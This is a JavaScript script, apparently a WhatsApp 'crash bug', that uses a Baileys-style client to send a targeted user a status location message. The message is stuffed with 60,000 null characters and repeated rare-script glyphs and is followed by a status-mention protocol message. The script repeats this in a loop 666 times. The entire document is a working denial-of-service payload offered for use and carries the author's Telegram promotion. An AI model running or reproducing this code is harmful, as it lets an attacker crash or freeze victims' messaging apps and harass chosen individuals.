async function TrashLocIoSInVis(sock, target) {
  const x = 60000;
  const locationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " #4izxvelzExerc1st. " 
      + "\u0000".repeat(x) 
      + "𑇂𑆵𑆴𑆿".repeat(x),
      address: "https://t.me/rizxvelzexct",
      contextInfo: {
        externalAdReply: {
          title: "𑇂𑆵𑆴𑆿".repeat(x),
          body: "𑇂𑆵𑆴𑆿".repeat(x),
          mediaType: 1,
          thumbnailUrl: "https://example.com/thumb.jpg",
          sourceUrl: "https://t.me/rizxvelzexct",
          mediaUrl: "https://example.com/media.jpg"
        }
      }
    }
  };

  try {
    const msg = await generateWAMessageFromContent("status@broadcast", {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            locationMessage: locationMessage.locationMessage
          }
        }
      },
      {}
    );

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "#Location?-💰" },
            content: undefined
          }
        ]
      }
    );

    console.log(chalk.green("Success Send Bug Location To Status By Syonx£hiro"));
  } catch (error) {
    console.error("Error sending message:", error);
  }
}i

// <<( The Calling Function )>>
for (let r = 0; r < 666; r++) {
await TrashLocIoSInVis(sock, target)
await new Promise(resolve => setTimeout(resolve, 2000));
}